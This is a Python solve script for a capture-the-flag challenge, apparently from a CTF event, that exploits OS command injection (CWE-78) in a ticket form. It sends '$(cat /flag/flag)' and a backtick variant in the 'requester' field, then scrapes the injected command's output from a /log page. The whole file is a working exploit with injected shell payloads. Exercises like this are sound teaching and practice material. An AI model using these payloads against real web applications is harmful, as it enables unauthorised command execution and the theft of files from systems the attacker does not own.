#!/usr/bin/env python3
"""
DeskOne (inj, 150) — CWE-78 OS command injection via command substitution.

The `requester` of a ticket is written to a desk log through a shell string, so
$(...) runs while the log line is built; the output appears on /log, not in the
ticket response.

Usage:
    python3 solve.py                          # defaults to inj7.chal.deti:8046
    python3 solve.py http://inj7.chal.deti:8046
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj7.chal.deti:8046"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    for payload in ("$(cat /flag/flag)", "`cat /flag/flag`"):
        requests.post(f"{BASE}/ticket", data={"requester": payload, "prio": "low"}, timeout=10)
        log = requests.get(f"{BASE}/log", timeout=10).text
        m = FLAG_RE.search(log)
        if m:
            print(f"[+] FLAG ({payload}): {m.group(0)}")
            return 0
    print("[-] no flag in log; probe which metachars survive the filter")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
